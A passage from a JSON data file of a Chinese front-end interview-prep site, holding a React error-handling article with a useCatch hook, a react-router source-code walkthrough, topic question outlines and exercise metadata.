错误处理函数完全可以分离，变成通用方法。\n3.  同步方法经过转换后会变为异步方法。  \n    所以理论上，要区分同步和异步方案。\n4.  错误处理函数再异常怎么办\n\n之后，我们会围绕着这些问题，继续展开。\n\n## Hooks版本\n\n有掘友说，这个年代了，谁还不用Hooks。  \n是的，大佬们说得对，我们得与时俱进。  \nHooks的基础版本已经有了，先分享使用，后续的文章跟上。\n\nHook的名字就叫useCatch\n\n```typescript\n\nconst TestView: React.FC<Props> = function (props) {\n\n    const [count, setCount] = useState(0);\n\n    \n    const doSomething  = useCatch(async function(){\n        console.log(\"doSomething: begin\");\n        throw new CatchError(\"doSomething error\")\n        console.log(\"doSomething: end\");\n    }, [], {\n        toast: true\n    })\n\n    const onClick = useCatch(async (ev) => {\n        console.log(ev.target);\n        setCount(count + 1);\n\n        doSomething();\n\n        const d = delay(3000, () => {\n            setCount(count => count + 1);\n            console.log()\n        });\n        console.log(\"delay begin:\", Date.now())\n\n        await d.run();\n        \n        console.log(\"delay end:\", Date.now())\n        console.log(\"TestView\", this)\n        throw new CatchError(\"自定义的异常，你知道不\")\n    },\n        [count],\n        {\n            message: \"I am so sorry\",\n            toast: true\n        });\n\n    return <div>\n        <div><button onClick={onClick}>点我</button></div>\n        <div>{count}</div>\n    </div>\n}\n\nexport default React.memo(TestView);\n```\n\n至于思路，基于`useMemo`,可以先看一下代码：\n\n```typescript\nexport function useCatch<T extends (...args: any[]) => any>(callback: T, deps: DependencyList, options: CatchOptions =DEFAULT_ERRPR_CATCH_OPTIONS): T {    \n\n    const opt =  useMemo( ()=> getOptions(options), [options]);\n    \n    const fn = useMemo((..._args: any[]) => {\n        const proxy = observerHandler(callback, undefined, function (error: Error) {\n            commonErrorHandler(error, opt)\n        });\n        return proxy;\n\n    }, [callback, deps, opt]) as T;\n\n    return fn;\n}\n\n```",
    "testPoint": "## **1. 错误边界的基本概念**\n- **考察点**：\n  - 什么是错误边界？\n  - 错误边界的作用及其工作原理。\n  - 为什么 React 需要错误边界？\n\n- **问题示例**：\n  - 什么是 React 的错误边界？它的作用是什么？\n  - React 组件中的错误会影响整个应用吗？为什么？\n  - React 中哪些错误可以被错误边界捕获？哪些不能？\n  - 错误边界能捕获异步代码（如 `setTimeout` 或 `fetch`）中的错误吗？如果不能，该如何处理？\n\n---\n\n## **2. 如何实现错误边界**\n- **考察点**：\n  - 如何正确实现错误边界组件？\n  - `componentDidCatch` 和 `getDerivedStateFromError` 的作用。\n  - 错误边界的基本用法。\n\n- **问题示例**：\n  - 如何在 React 组件中创建一个错误边界？\n  - `componentDidCatch` 和 `getDerivedStateFromError` 的区别是什么？\n  - `componentDidCatch` 的参数有哪些？如何使用？\n  - 错误边界的 `componentDidCatch` 是否可以在函数组件中使用？为什么？\n\n---\n\n## **3. 错误边界的适用范围**\n- **考察点**：\n  - 错误边界的作用范围及其对不同组件的影响。\n  - 是否应该在应用的根组件上设置错误边界？\n  - 错误边界的最佳实践。\n\n- **问题示例**：\n  - 错误边界应该放在应用的哪个层级？为什么？\n  - 如何在大型应用中合理使用错误边界？\n  - 在 React 16 之前，如何处理组件中的错误？\n  - `StrictMode` 是否会影响错误边界的行为？\n\n---\n\n## **4. 错误边界的局限性**\n- **考察点**：\n  - 错误边界的局限性，如无法捕获事件处理函数中的错误。\n  - 不能捕获错误的场景及解决方案。\n\n- **问题示例**：\n  - React 错误边界不能捕获哪些类型的错误？如何处理？\n  - 为什么错误边界无法捕获 `setTimeout` 里的错误？如何解决？\n  - 在错误边界无法捕获的场景下，如何进行全局错误监控？\n\n---\n\n## **5. 错误边界与 Hooks**\n- **考察点**：\n  - React Hooks 不能直接使用 `componentDidCatch`，如何在函数组件中实现错误边界？\n  - `useEffect` 是否可以替代 `componentDidCatch`？\n\n- **问题示例**：\n  - 为什么 React Hooks 不能使用 `componentDidCatch`？\n  - 在 Hooks 组件中如何实现类似错误边界的功能？\n  - `useEffect` 能够捕获组件渲染过程中的错误吗？为什么？\n\n---\n\n## **6. 错误边界与 React Router 结合**\n- **考察点**：\n  - 在路由跳转时如何确保错误边界生效？\n  - 发生错误时，如何跳转到错误页面？\n\n- **问题示例**：\n  - 如何结合 React Router 让某个页面在发生错误时跳转到 `/error`？\n  - 在 `Suspense` 组件中，错误边界如何影响懒加载组件？\n\n---\n\n## **7. 错误边界与日志记录**\n- **考察点**：\n  - 结合日志系统（如 Sentry、LogRocket）记录错误信息。\n\n- **问题示例**：\n  - 如何在错误边界中上报错误日志？\n  - `componentDidCatch` 中的错误信息如何存储到日志系统？\n  - 错误边界如何与 Sentry 结合？\n\n---\n\n## **8. 错误边界在生产环境中的应用**\n- **考察点**：\n  - 在实际项目中如何使用错误边界保证应用的健壮性？\n  - 在组件库或 UI 框架中如何利用错误边界提升用户体验？\n\n- **问题示例**：\n  - 在生产环境中，如何合理使用错误边界？\n  - 如何在 UI 组件库（如 Ant Design）中使用错误边界？\n  - 错误边界如何配合 `fallback UI` 提供良好的用户体验？\n",
    "exerciseKeyList": "[\"3cd22a2e-ada1-4e6b-9efd-9b719823ab52\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:09:40.000Z",
    "updateAt": "2025-03-20T01:47:31.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "3cd22a2e-ada1-4e6b-9efd-9b719823ab52",
        "title": "在 React 项目中，一般怎么处理错误？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-03-20T01:47:17.000Z",
        "updateAt": "2025-03-20T01:47:22.000Z"
      }
    ]
  },
  "210": {
    "id": 210,
    "tagId": 13,
    "title": "react-router",
    "explanation": "写在前面：为什么要学习react-router底层源码? 为什么要弄明白整个路由流程？\n\n学习react-router，有助于我们学习单页面应用(spa)路由跳转原理，让我们理解从`history.push`，到组件页面切换的全套流程，使我们在面试的时候不再为路由相关的问题发怵，废话不说，让我们开启深入react-router源码之旅吧。\n\n## 一 正确理解react-router\n\n### 1 理解单页面应用\n\n**什么是单页面应用？**\n\n个人理解，单页面应用是使用一个html下，一次性加载js, css等资源，所有页面都在一个容器页面下，页面切换实质是组件的切换。\n\n![](https://static.ecool.fun//article/0ce6a25f-7b8b-46e3-8a9a-0abcc4d18dd6.awebp)\n\n### 2 react-router初探，揭露路由原理面纱\n\n#### ①`react-router-dom`和`react-router`和`history`库三者什么关系\n\n`**history**` 可以理解为`react-router`的核心，也是整个路由原理的核心，里面集成了`popState,history.pushState`等底层路由实现的原理方法，接下来我们会一一解释。\n\n`**react-router**`可以理解为是`**react-router-dom**`的核心，里面封装了`Router，Route，Switch`等核心组件,实现了从路由的改变到组件的更新的核心功能,在我们的项目中只要一次性引入`react-router-dom`就可以了。\n\n`**react-router-dom**`,在`react-router`的核心基础上，添加了用于跳转的`Link`组件，和histoy模式下的`BrowserRouter`和hash模式下的`HashRouter`组件等。所谓`**BrowserRouter和HashRouter，也只不过用了history库中createBrowserHistory和createHashHistory方法**`\n\n`react-router-dom` 我们不多说了，这里我们重点看一下`react-router`。\n\n#### ②来个小demo尝尝鲜?\n\n```js\nimport { BrowserRouter as Router, Switch, Route, Redirect,Link } from 'react-router-dom'\n\nimport Detail from '../src/page/detail'\nimport List from '../src/page/list'\nimport Index from '../src/page/home/index'\n\nconst menusList = [\n  {\n    name: '首页',\n    path: '/index'\n  },\n  {\n    name: '列表',\n    path: '/list'\n  },\n  {\n    name: '详情',\n    path: '/detail'\n  },\n]\nconst index = () => {\n  return <div >\n    <div >\n     \n      <Router  >\n      <div>{\n        /* link 路由跳转 */\n         menusList.map(router=><Link key={router.path} to={ router.path } >\n           <span className=\"routerLink\" >{router.name}</span>\n         </Link>)\n      }</div>\n        <Switch>\n          <Route path={'/index'} component={Index} ></Route>\n          <Route path={'/list'} component={List} ></Route>\n          <Route path={'/detail'} component={Detail} ></Route>\n          {/*  路由不匹配，重定向到/index  */}\n          <Redirect from='/*' to='/index' />\n        </Switch>\n      </Router>\n    </div>\n  </div>\n}\n```\n\n**效果如下**\n\n![](https://static.ecool.fun//article/60ed3ecb-1211-40f5-bd2a-d4884bfb06e1.awebp)\n\n## 二 单页面实现核心原理\n\n单页面应用路由实现原理是，切换url，监听url变化，从而渲染不同的页面组件。\n\n主要的方式有`history`模式和`hash`模式。\n\n### 1 history模式原理\n\n#### ①改变路由\n\n`**history.pushState**`\n\n```js\nhistory.pushState(state,title,path)\n```\n\n1 `**state**`：一个与指定网址相关的状态对象， popstate 事件触发时，该对象会传入回调函数。如果不需要可填 null。\n\n2 `**title**`：新页面的标题，但是所有浏览器目前都忽略这个值，可填 null。\n\n3 `**path**`：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个地址。\n\n`**history.replaceState**`\n\n```js\nhistory.replaceState(state,title,path)\n```\n\n参数和`pushState`一样，这个方法会修改当前的 `history` 对象记录， `history.length` 的长度不会改变。\n\n#### ②监听路由\n\n`**popstate事件**`\n\n```js\nwindow.addEventListener('popstate',function(e){\n    /* 监听改变 */\n})\n```\n\n同一个文档的 `history` 对象出现变化时，就会触发 `popstate` 事件 \b `history.pushState` 可以使浏览器地址改变，但是无需刷新页面。**注意⚠️的是：用 `history.pushState()` 或者 `history.replaceState()` 不会触发 `popstate` 事件**。 `popstate` 事件只会在浏览器某些行为下触发, 比如点击后退、前进按钮或者调用 `history.back()、history.forward()、history.go()`方法。\n\n### 2 hash模式原理\n\n#### ①改变路由\n\n`**window.location.hash**`\n\n通过`window.location.hash` 属性获取和设置 `hash` 值。\n\n#### ②监听路由\n\n`**onhashchange**`\n\n```js\nwindow.addEventListener('hashchange',function(e){\n    /* 监听改变 */\n})\n```\n\n## 三 理解history库\n\n`react-router`路由离不开`history`库，history专注于记录路由history状态，以及path改变了，我们应该**做写什么**， 在history模式下用`popstate`监听路由变化，在hash模式下用`hashchange`监听路由的变化。\n\n接下来我们看 `Browser`模式下的`createBrowserHistory` 和 `Hash`模式下的 `createHashHistory`方法。\n\n### 1 createBrowserHistory\n\nBrowser模式下路由的运行 ，一切都从`createBrowserHistory`开始。这里我们参考的history-4.7.2版本，最新版本中api可能有些出入，但是原理都是一样的，在解析history过程中，我们重点关注`setState ,push ,handlePopState,listen`方法\n\n```js\nconst PopStateEvent = 'popstate'\nconst HashChangeEvent = 'hashchange'\n/* 这里简化了createBrowserHistory，列出了几个核心api及其作用 */\nfunction createBrowserHistory(){\n    /* 全局history  */\n    const globalHistory = window.history\n    /* 处理路由转换，记录了listens信息。 */\n    const transitionManager = createTransitionManager()\n    /* 改变location对象，通知组件更新 */\n    const setState = () => { /* ... */ }\n    \n    /* 处理当path改变后，处理popstate变化的回调函数 */\n    const handlePopState = () => { /* ... */ }\n   \n    /* history.push方法，改变路由，通过全局对象history.pushState改变url, 通知router触发更新，替换组件 */\n    const push=() => { /*...*/ }\n    \n    /* 底层应用事件监听器，监听popstate事件 */\n    const listen=()=>{ /*...*/ } \n    return {\n       push,\n       listen,\n       /* .... */ \n    }\n}\n```\n\n下面逐一分析各个api,和他们之前的相互作用\n\n```js\nconst PopStateEvent = 'popstate'\nconst HashChangeEvent = 'hashchange'\n```\n\n`**popstate**` 和`**hashchange**`是监听路由变化底层方法。\n\n#### ①setState\n\n```js\nconst setState = (nextState) => {\n    /* 合并信息 */\n    Object.assign(history, nextState)\n    history.length = globalHistory.length\n    /* 通知每一个listens 路由已经发生变化 */\n    transitionManager.notifyListeners(\n      history.location,\n      history.action\n    )\n  }\n```\n\n**代码很简单：统一每个`transitionManager`管理的`listener`路由状态已经更新。**\n\n什么时候绑定`litener`， 我们在接下来的`**React-Router**`代码中会介绍。\n\n#### ②listen\n\n```js\nconst listen = (listener) => {\n    /* 添加listen */\n    const unlisten = transitionManager.appendListener(listener)\n    checkDOMListeners(1)\n\n    return () => {\n      checkDOMListeners(-1)\n      unlisten()\n    }\n}\n```\n\n**checkDOMListeners**\n\n```js\nconst checkDOMListeners = (delta) => {\n    listenerCount += delta\n    if (listenerCount === 1) {\n      addEventListener(window, PopStateEvent, handlePopState)\n      if (needsHashChangeListener)\n        addEventListener(window, HashChangeEvent, handleHashChange)\n    } else if (listenerCount === 0) {\n      removeEventListener(window, PopStateEvent, handlePopState)\n      if (needsHashChangeListener)\n        removeEventListener(window, HashChangeEvent, handleHashChange)\n    }\n  }\n```\n\nlisten本质通过`checkDOMListeners`的参数 **1** 或 **\\-1** 来绑定/解绑 `__popstate__` 事件，当路由发生改变的时候，调用处理函数`**handlePopState**` 。\n\n接下来我们看看`push`方法。\n\n#### ③push\n\n```js\n const push = (path, state) => {\n    const action = 'PUSH'\n    /* 1 创建location对象 */\n    const location = createLocation(path, state, createKey(), history.location)\n    /* 确定是否能进行路由转换，还在确认的时候又开始了另一个转变 ,可能会造成异常 */\n    transitionManager.confirmTransitionTo(location, action, getUserConfirmation, (ok) => {\n      if (!ok)\n        return\n      const href = createHref(location)\n      const { key, state } = location\n      if (canUseHistory) {\n        /* 改变 url */\n        globalHistory.pushState({ key, state }, null, href)\n        if (forceRefresh) {\n          window.location.href = href\n        } else {\n          /* 改变 react-router location对象, 创建更新环境 */\n          setState({ action, location })\n        }\n      } else {\n        window.location.href = href\n      }\n    })\n  }\n```\n\n`push ( history.push )` 流程大致是 **首先生成一个最新的`location`对象，然后通过`window.history.pushState`方法改变浏览器当前路由(即当前的path),最后通过`setState`方法通知`React-Router`更新，并传递当前的location对象，由于这次url变化的，是`history.pushState`产生的，并不会触发`popState`方法，所以需要手动`setState`，触发组件更新**。\n\n#### ④handlePopState\n\n最后我们来看看当`popState`监听的函数，当`path`改变的时候会发生什么，\n\n```js\n/* 我们简化一下handlePopState */\nconst handlePopState = (event)=>{\n     /* 获取当前location对象 */\n    const location = getDOMLocation(event.state)\n    const action = 'POP'\n\n    transitionManager.confirmTransitionTo(location, action, getUserConfirmation, (ok) => {\n        if (ok) {\n          setState({ action, location })\n        } else {\n          revertPop(location)\n        }\n    })\n}\n```\n\n`handlePopState` 代码很简单 ，判断一下`action类型为pop`,然后 `setState` ，从新加载组件。\n\n### 2 createHashHistory\n\nhash 模式和 history API类似，我们重点讲一下 hash模式下，怎么监听路由，和`push , replace`方法是怎么改变改变路径的。\n\n#### 监听哈希路由变化\n\n```js\n  const HashChangeEvent = 'hashchange'\n  const checkDOMListeners = (delta) => {\n    listenerCount += delta\n    if (listenerCount === 1) {\n      addEventListener(window, HashChangeEvent, handleHashChange)\n    } else if (listenerCount === 0) {\n      removeEventListener(window, HashChangeEvent, handleHashChange)\n    }\n  }\n```\n\n和之前所说的一样，就是用`hashchange`来监听hash路由的变化。\n\n#### 改变哈希路由\n\n```js\n\n/* 对应 push 方法 */\nconst pushHashPath = (path) =>\n  window.location.hash = path\n\n/* 对应replace方法 */\nconst replaceHashPath = (path) => {\n  const hashIndex = window.location.href.indexOf('#')\n\n  window.location.replace(\n    window.location.href.slice(0, hashIndex >= 0 ? hashIndex : 0) + '#' + path\n  )\n}\n\n```\n\n在`**hash**`模式下 ，`history.push` 底层是调用了`**window.location.href**`来改变路由。`history.replace`底层是掉用 `window.location.replace`改变路由。\n\n### 总结\n\n**我们用一幅图来描述了一下`history`库整体流程。**\n\n![](https://static.ecool.fun//article/d5fa52c3-6e65-4962-8945-f83176ee42c6.awebp)\n\n## 四 核心api\n\n### 1 Router-接收location变化，派发更新流\n\n**`Router` 作用是把 `history location` 等路由信息 传递下去**\n\n`**Router**`\n\n```js\n/* Router 作用是把 history location 等路由信息 传递下去  */\nclass Router extends React.Component {\n  static computeRootMatch(pathname) {\n    return { path: '/', url: '/', params: {}, isExact: pathname === '/' };\n  }\n  constructor(props) {\n    super(props);\n    this.state = {\n      location: props.history.location\n    };\n    //记录pending位置\n    //如果存在任何<Redirect>，则在构造函数中进行更改\n    //在初始渲染时。如果有，它们将在\n    //在子组件身上激活，我们可能会\n    //在安装<Router>之前获取一个新位置。\n    this._isMounted = false;\n    this._pendingLocation = null;\n    /* 此时的history，是history创建的history对象 */\n    if (!props.staticContext) {\n      /* 这里判断 componentDidMount 和 history.listen 执行顺序 然后把 location复制 ，防止组件重新渲染 */\n      this.unlisten = props.history.listen(location => {\n        /* 创建监听者 */\n        if (this._isMounted) {\n\n          this.setState({ location });\n        } else {\n          this._pendingLocation = location;\n        }\n      });\n    }\n  }\n  componentDidMount() {\n    this._isMounted = true;\n    if (this._pendingLocation) {\n      this.setState({ location: this._pendingLocation });\n    }\n  }\n  componentWillUnmount() {\n    /* 解除监听 */\n    if (this.unlisten) this.unlisten();\n  }\n  render() {\n    return (\n      /*  这里可以理解 react.createContext 创建一个 context上下文 ，保存router基本信息。children */\n      <RouterContext.Provider\n          children={this.props.children || null}\n          value={{\n          history: this.props.history,\n          location: this.state.location,\n          match: Router.computeRootMatch(this.state.location.pathname),\n          staticContext: this.props.staticContext\n        }}\n      />\n    );\n  }\n}\n```\n\n总结：\n\n初始化绑定listen, 路由变化,通知改变`location`,改变组件。 react的history路由状态是保存在`React.Content`上下文之间, 状态更新。\n\n**一个项目应该有一个根`Router` ， 来产生切换路由组件之前的更新作用。** **如果存在多个`Router`会造成，会造成切换路由，页面不更新的情况。**\n\n### 2 Switch-匹配正确的唯一的路由\n\n根据router更新流，来渲染当前组件。\n\n```js\n/* switch组件 */\nclass Switch extends React.Component {\n  render() {\n    return (\n      <RouterContext.Consumer>\n        {/* 含有 history location 对象的 context */}\n        {context => {\n          invariant(context, 'You should not use <Switch> outside a <Router>');\n          const location = this.props.location || context.location;\n          let element, match;\n          //我们使用React.Children.forEach而不是React.Children.toArray（）.find（）\n          //这里是因为toArray向所有子元素添加了键，我们不希望\n          //为呈现相同的两个<Route>s触发卸载/重新装载\n          //组件位于不同的URL。\n          //这里只需然第一个 含有 match === null 的组件\n          React.Children.forEach(this.props.children, child => {\n            if (match == null && React.isValidElement(child)) {\n              element = child;\n              // 子组件 也就是 获取 Route中的 path 或者 rediect 的 from\n              const path = child.props.path || child.props.from;\n              match = path\n                ? matchPath(location.pathname, { ...child.props, path })\n                : context.match;\n            }\n          });\n          return match\n            ? React.cloneElement(element, { location, computedMatch: match })\n            : null;\n        }}\n      </RouterContext.Consumer>\n    );\n  }\n}\n\n```\n\n找到与当前path,匹配的组件进行渲染。 通过`pathname`和组件的`path`进行匹配。找到符合path的router组件。\n\n#### matchPath\n\n```js\nfunction matchPath(pathname, options = {}) {\n  if (typeof options === \"string\" || Array.isArray(options)) {\n    options = { path: options };\n  }\n\n  const { path, exact = false, strict = false, sensitive = false } = options;\n\n  const paths = [].concat(path);\n\n  return paths.reduce((matched, path) => {\n    if (!path && path !== \"\") return null;\n    if (matched) return matched;\n\n    const { regexp, keys } = compilePath(path, {\n      end: exact,\n      strict,\n      sensitive\n    });\n    const match = regexp.exec(pathname);\n    /* 匹配不成功，返回null */\n    if (!match) return null;\n\n    const [url, ...values] = match;\n    const isExact = pathname === url;\n\n    if (exact && !isExact) return null;\n\n    return {\n      path, // the path used to match\n      url: path === \"/\" && url === \"\" ? \"/\" : url, // the matched portion of the URL\n      isExact, // whether or not we matched exactly\n      params: keys.reduce((memo, key, index) => {\n        memo[key.name] = values[index];\n        return memo;\n      }, {})\n    };\n  }, null);\n}\n```\n\n匹配符合的路由。\n\n### 3 Route-组件页面承载容器\n\n```js\n/**\n * The public API for matching a single path and rendering.\n */\nclass Route extends React.Component {\n  render() {\n    return (\n      <RouterContext.Consumer>\n        {context => {\n          /* router / route 会给予警告警告 */\n          invariant(context, \"You should not use <Route> outside a <Router>\");\n          // computedMatch 为 经过 swich处理后的 path\n          const location = this.props.location || context.location;\n          const match = this.props.computedMatch \n            ? this.props.computedMatch // <Switch> already computed the match for us\n            : this.props.path\n            ? matchPath(location.pathname, this.props)\n            : context.match;\n          const props = { ...context, location, match };\n          let { children, component, render } = this.props;\n\n          if (Array.isArray(children) && children.length === 0) {\n            children = null;\n          }\n\n          return (\n            <RouterContext.Provider value={props}>\n              {props.match\n                ? children\n                  ? typeof children === \"function\"\n                    ? __DEV__\n                      ? evalChildrenDev(children, props, this.props.path)\n                      : children(props)\n                    : children\n                  : component\n                  ? React.createElement(component, props)\n                  : render\n                  ? render(props)\n                  : null\n                : typeof children === \"function\"\n                ? __DEV__\n                  ? evalChildrenDev(children, props, this.props.path)\n                  : children(props)\n                : null}\n            </RouterContext.Provider>\n          );\n        }}\n      </RouterContext.Consumer>\n    );\n  }\n}\n```\n\n匹配path,渲染组件。作为路由组件的容器,可以根据将实际的组件渲染出来。通过`RouterContext.Consume` 取出当前上一级的`location,match`等信息。作为prop传递给页面组件。使得我们可以在页面组件中的props中获取`location ,match`等信息。\n\n### 4 Redirect-没有符合的路由，那么重定向\n\n重定向组件， 如果来路由匹配上，会重定向对应的路由。\n\n```js\nfunction Redirect({ computedMatch, to, push = false }) {\n  return (\n    <RouterContext.Consumer>\n      {context => {\n        const { history, staticContext } = context;\n        /* method就是路由跳转方法。 */\n        const method = push ? history.push : history.replace;\n        /* 找到符合match的location ，格式化location */\n        const location = createLocation(\n          computedMatch\n            ? typeof to === 'string'\n              ? generatePath(to, computedMatch.params)\n              : {\n                  ...to,\n                  pathname: generatePath(to.pathname, computedMatch.params)\n                }\n            : to\n        )\n        /* 初始化的时候进行路由跳转，当初始化的时候，mounted执行push方法，当组件更新的时候，如果location不相等。同样会执行history方法重定向 */\n        return (\n          <Lifecycle\n              onMount={() => {\n              method(location);\n            }}\n              onUpdate={(self, prevProps) => {\n              const prevLocation = createLocation(prevProps.to);\n              if (\n                !locationsAreEqual(prevLocation, {\n                  ...location,\n                  key: prevLocation.key\n                })\n              ) {\n                method(location);\n              } \n            }}\n              to={to}\n          />\n        );\n      }}\n    </RouterContext.Consumer>\n  );\n}\n\n```\n\n**初始化的时候进行路由跳转，当初始化的时候，`mounted`执行`push`方法，当组件更新的时候，如果`location`不相等。同样会执行`history`方法重定向。**\n\n## 五 总结 + 流程分析\n\n### 总结\n\n`**history**`提供了核心api，如监听路由，更改路由的方法，已经保存路由状态state。\n\n`**react-router**`提供路由渲染组件，路由唯一性匹配组件，重定向组件等功能组件。\n\n### 流程分析\n\n**当地址栏改变url，组件的更新渲染都经历了什么？😊😊😊** 拿history模式做参考。当url改变，首先触发histoy，调用事件监听`popstate`事件， 触发回调函数`handlePopState`，触发history下面的`setstate`方法，产生新的location对象，然后通知Router组件更新`location`并通过context上下文传递，`switch`通过传递的更新流，匹配出符合的Route组件渲染，最后有`Route`组件取出`context`内容，传递给渲染页面，渲染更新。\n\n**当我们调用`history.push`方法，切换路由，组件的更新渲染又都经历了什么呢？**\n\n我们还是拿history模式作为参考，当我们调用`history.push`方法，首先调用history的`push`方法，通过`history.pushState`来改变当前`url`，接下来触发history下面的`setState`方法，接下来的步骤就和上面一模一样了，这里就不一一说了。\n\n### 我们用一幅图来表示各个路由组件之间的关系。\n\n![](https://static.ecool.fun//article/3e572329-097d-4793-b45a-4103aae041b9.awebp)",
    "testPoint": "## **1. React Router 的基本概念**\n- **考察点**：\n  - React Router 的作用及其核心概念。\n  - React Router 是如何工作的？\n  - SPA（单页面应用）中的路由管理。\n\n- **问题示例**：\n  - 什么是 React Router？它的主要作用是什么？\n  - React Router 如何管理单页面应用（SPA）的路由？\n  - 什么是 `BrowserRouter` 和 `HashRouter`？它们有什么区别？\n  - React Router 的路由匹配规则是什么？\n  - `exact` 在 React Router v5 中的作用是什么？为什么 v6 中去掉了 `exact`？\n\n---\n\n## **2. React Router 的基本使用**\n- **考察点**：\n  - 如何定义路由？\n  - 如何在组件中获取路由信息？\n  - 动态路由参数的获取方法。\n\n- **问题示例**：\n  - React Router 中如何定义一个基本的路由？\n  - 在 v6 版本中，如何使用 `<Routes>` 和 `<Route>`？\n  - 在组件中如何获取当前路由参数？\n  - `useNavigate` 和 `useHistory` 有什么区别？为什么 v6 替换了 `useHistory`？\n  - 如何在 React Router 中实现路由重定向？\n\n---\n\n## **3. React Router 的动态路由**\n- **考察点**：\n  - 动态路由的定义和匹配。\n  - 如何获取动态参数。\n\n- **问题示例**：\n  - 在 React Router v6 中，如何定义动态路由？\n  - `useParams` 在动态路由中如何使用？\n  - `useSearchParams` 和 `useParams` 的区别是什么？\n  - 如何在 React Router 中解析查询参数（`?id=123&type=post`）？\n\n---\n\n## **4. 路由导航**\n- **考察点**：\n  - 如何在 React Router 中进行编程式导航？\n  - `Link` 和 `NavLink` 的作用及区别。\n\n- **问题示例**：\n  - 如何在 React 组件中进行路由跳转？\n  - `Link` 和 `a` 标签有什么区别？\n  - `NavLink` 如何实现高亮状态？\n  - `useNavigate` 的 `replace: true` 作用是什么？\n  - `go(-1)` 和 `goBack()` 有什么区别？\n\n---\n\n## **5. 路由守卫（权限控制）**\n- **考察点**：\n  - 如何实现路由权限控制？\n  - `useEffect` 在路由守卫中的作用。\n\n- **问题示例**：\n  - 如何在 React Router 中实现权限控制（如未登录用户不能访问某些页面）？\n  - 如何基于用户角色动态渲染路由？\n  - 在 React Router 中，如何封装一个 `PrivateRoute` 组件？\n  - 在路由守卫中，如何确保用户未登录时跳转到登录页？\n\n---\n\n## **6. 路由懒加载**\n- **考察点**：\n  - 结合 `React.lazy` 和 `Suspense` 实现路由懒加载。\n  - 如何优化大规模应用的路由加载。\n\n- **问题示例**：\n  - 如何在 React Router 中实现懒加载？\n  - `React.lazy` 和 `Suspense` 在路由懒加载中的作用是什么？\n  - 在懒加载路由时，如何为用户提供加载指示（Loading）？\n  - 如何使用 `import.meta.glob` 批量导入路由？\n\n---\n\n## **7. 路由嵌套**\n- **考察点**：\n  - 如何使用 `Outlet` 渲染嵌套路由？\n  - 父子路由如何协同工作？\n\n- **问题示例**：\n  - 如何在 React Router v6 中定义嵌套路由？\n  - `Outlet` 在嵌套路由中的作用是什么？\n  - 为什么在 v6 版本中，嵌套路由不再使用 `children` 而是 `element`？\n  - 如何在嵌套路由中获取 `parentPath`？\n\n---\n\n## **8. 404 页面（Not Found）**\n- **考察点**：\n  - 如何在 React Router 中定义 404 页面？\n  - 404 页面如何与 `useNavigate` 结合？\n\n- **问题示例**：\n  - 如何在 React Router v6 中配置 404 页面？\n  - 404 页面如何与 `navigate(-1)` 结合返回上一页？\n  - 在动态路由中，如何确保未匹配的 URL 跳转到 404？\n\n---\n\n## **9. 路由动画**\n- **考察点**：\n  - 如何使用 `react-transition-group` 或 `framer-motion` 实现路由动画？\n\n- **问题示例**：\n  - 如何在 React Router 中添加页面切换动画？\n  - `react-transition-group` 如何与 React Router 结合？\n  - `framer-motion` 如何实现路由过渡效果？\n\n---\n\n## **10. 路由状态管理**\n- **考察点**：\n  - 如何在路由之间传递状态？\n  - `useLocation` 的作用及使用方式。\n\n- **问题示例**：\n  - 如何在 `navigate` 过程中传递 `state`？\n  - `useLocation` 可以获取哪些信息？\n  - `useLocation` 和 `useParams` 的区别是什么？\n\n---\n\n## **11. SSR（服务器端渲染）与 React Router**\n- **考察点**：\n  - React Router 如何支持 SSR？\n  - `react-router-dom` 和 `react-router` 在 SSR 场景下的区别。\n\n- **问题示例**：\n  - React Router 在 SSR 场景下如何使用？\n  - `StaticRouter` 在 SSR 中的作用是什么？\n  - SSR 如何确保正确的路由匹配？\n\n---\n\n## **12. React Router v5 和 v6 的区别**\n- **考察点**：\n  - React Router v6 相比 v5 的改动点。\n  - 为什么要从 `Switch` 改成 `Routes`？\n\n- **问题示例**：\n  - React Router v5 和 v6 在路由配置上的主要区别是什么？\n  - 为什么 React Router v6 移除了 `exact`？\n  - `Switch` 和 `Routes` 有什么不同？",
    "exerciseKeyList": "[\"197d354c-bc4c-4715-bf47-7af0c347f997\",\"514f2a2f-5707-4068-8b2d-baf16af8c489\",\"0227182d-cafd-426e-a6a7-3e71364c2755\",\"2b68a2b5-ab3a-4de4-af48-43ab5f7e99f8\",\"637b0af3-e1e1-42c0-9825-e34aa0a4e4a0\",\"eb1b05fa-d58b-4d72-bf81-3cd8bab13f55\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:12:44.000Z",
    "updateAt": "2025-03-20T01:51:18.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0227182d-cafd-426e-a6a7-3e71364c2755",
        "title": "React 中，如何实现类似于 Vue-router 提供的路由守卫？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-16T01:20:19.000Z"
      },
      {
        "exerciseKey": "197d354c-bc4c-4715-bf47-7af0c347f997",
        "title": "React Router 中，HashRouter 和 BrowserRouter 的区别和原理？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:07:07.000Z"
      },
      {
        "exerciseKey": "2b68a2b5-ab3a-4de4-af48-43ab5f7e99f8",
        "title": "说说React Router有几种模式，以及实现原理？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:28:50.000Z",
        "updateAt": "2024-08-10T17:05:56.000Z"
      },
      {
        "exerciseKey": "514f2a2f-5707-4068-8b2d-baf16af8c489",
        "title": "使用 react-router 跳转时，如何将参数传递给下一个页面？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-20T11:24:24.000Z"
      },
      {
        "exerciseKey": "637b0af3-e1e1-42c0-9825-e34aa0a4e4a0",
        "title": "说说你对React Router的理解？常用的Router组件有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:28:13.000Z",
        "updateAt": "2024-08-10T17:05:55.000Z"
      },
      {
        "exerciseKey": "eb1b05fa-d58b-4d72-bf81-3cd8bab13f55",
        "title": "react-router 里的 <Link> 标签和 <a> 标签有什么区别？",
        "category": "QA",
